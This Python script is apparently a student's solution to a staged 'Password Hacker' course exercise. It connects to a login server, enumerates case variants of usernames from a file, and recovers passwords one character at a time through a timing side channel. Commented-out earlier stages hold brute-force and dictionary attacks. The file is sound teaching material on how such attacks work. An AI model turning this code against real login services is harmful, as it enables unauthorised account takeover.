# write your code here
import argparse
import cProfile
import itertools
import json
import socket
import string
import time

FACTOR = 10

profiler = cProfile.Profile()

PASSWORD_EMPTY = ''

parser = argparse.ArgumentParser(
    prog='Password Hacker',
    description='What the program does - hacks')

parser.add_argument('domain')
parser.add_argument('port')

# from stage 1
# parser.add_argument('password')

args = parser.parse_args()

domain = args.domain
port = int(args.port)
connection_credentials = (domain, port)

# from stage 1
# password_try = str(args.password)

SOCK_BUFFER = 1024
SERVER_RESPONSE_LOGIN_SUCCESSFUL = 'Connection success!'
SERVER_RESPONSE_WRONG_PASSWORD = 'Wrong password!'
SERVER_RESPONSE_EXCEPTION_HAPPENED_DURING_LOGIN = 'Exception happened during login'

# from stage 2
DIGITS = string.digits
LETTERS = string.ascii_letters

# from stage 2
# DIGITS = ['0', '1']
# LETTERS = ['a', 'b']
LETTERS_WITH_DIGITS = LETTERS + DIGITS

FILE_PASSWORDS = 'hacking/passwords.txt'
FILE_LOGINS = 'hacking/logins.txt'


# test
# FILE_LOGINS = 'logins.txt'


# FILE_PASSWORDS = 'passwords.txt'


# from stage 2 - bruteforce
# def password_yield():
#
#     for dimension in range(1, len(LETTERS_WITH_DIGITS) + 1):
#         combinations = map(lambda combination: '%s' * dimension % combination,
#                            itertools.product(*[LETTERS_WITH_DIGITS for _ in range(dimension)]))
#         for combination_i in combinations:
#             yield combination_i

# FROM STAGE 3
#
# def password_yield(file_ind):
#     for pwd_line in file_ind:
#         password = pwd_line.rstrip('\n')
#         for password_perm in map(lambda permutation: ''.join(permutation),
#                                  itertools.product(*zip(password.lower(), password.upper()))):
#             yield password_perm

def login_yield(file_ind):
    for login_line in file_ind:
        login = login_line.rstrip('\n')
        for login_perm in map(lambda permutation: ''.join(permutation),
                              itertools.product(*zip(login.lower(), login.upper()))):
            yield login_perm


def client_send_message(sock_arg, msg):
    sock_arg.send(msg.encode())
    return sock_arg.recv(SOCK_BUFFER).decode()


def password_yield():
    for sign in LETTERS_WITH_DIGITS:
        yield sign


def pick_result(message):
    return json.loads(message)['result']


# FROM_STAGE 3
#
# with socket.socket() as sock, open(FILE_PASSWORDS) as file_pwd_ind:
#     sock.connect(connection_credentials)
#     for password_try in password_yield(file_pwd_ind):
#         # print(password_try)
#         if client_send_message(sock, password_try) == SERVER_RESPONSE_LOGIN_SUCCESSFUL:
#             print(password_try)
#             break

with socket.socket() as sock, open(FILE_LOGINS) as file_login_ind, open('asdasdasd.txt', 'w') as logger:
    sock.connect(connection_credentials)
    i = 0
    for login_try in login_yield(file_login_ind):
        i += 1
        message_determine_login_obj = {
            'login': login_try,
            'password': ' ',
        }
        message_determine_login = json.dumps(message_determine_login_obj)
        start_login = time.time()
        empty_password_login_result = pick_result(client_send_message(sock, message_determine_login))
        end_login = time.time()
        # # test
        # empty_password_login_result = SERVER_RESPONSE_WRONG_PASSWORD if i > 101 else 'Wrong login!'

        # profiler.print_stats()

        if empty_password_login_result == SERVER_RESPONSE_WRONG_PASSWORD:
            execution_time_login = end_login - start_login
            execution_time_last = 0
            j = 0
            password_found = ''
            while True:
                j += 1
                for password_try in password_yield():
                    message_password_try_obj = {
                        'login': login_try,
                        'password': password_found + password_try,
                    }
                    message_determine_password = json.dumps(message_password_try_obj)
                    start_pwd = time.time()
                    try:
                        server_message = pick_result(client_send_message(sock, message_determine_password))
                    except json.decoder.JSONDecodeError:
                        # logger.write(message_determine_password)
                        print(json.dumps({'login': execution_time_login, 'password': execution_time_last,
                                          'is_greater': (execution_time - execution_time_login) * 1000000}))
                        exit()

                    end_pwd = time.time()

                    execution_time = end_pwd - start_pwd
                    execution_time_last = execution_time
                    # test from stage 4
                    # server_message = SERVER_RESPONSE_LOGIN_SUCCESSFUL if j > 100 else (
                    #     SERVER_RESPONSE_EXCEPTION_HAPPENED_DURING_LOGIN if random.randint(1,
                    #                                                                       2) == 1 else 'Wrong password!')

                    # from stage 4
                    # if server_message == SERVER_RESPONSE_EXCEPTION_HAPPENED_DURING_LOGIN:
                    if execution_time > execution_time_login * FACTOR:
                        password_found += password_try
                        logger.write(password_found + '\n')
                        break
                    if server_message == SERVER_RESPONSE_LOGIN_SUCCESSFUL:
                        print(message_determine_password)
                        quit()
print(json.dumps({'login': 'error', 'password': 'error'}))
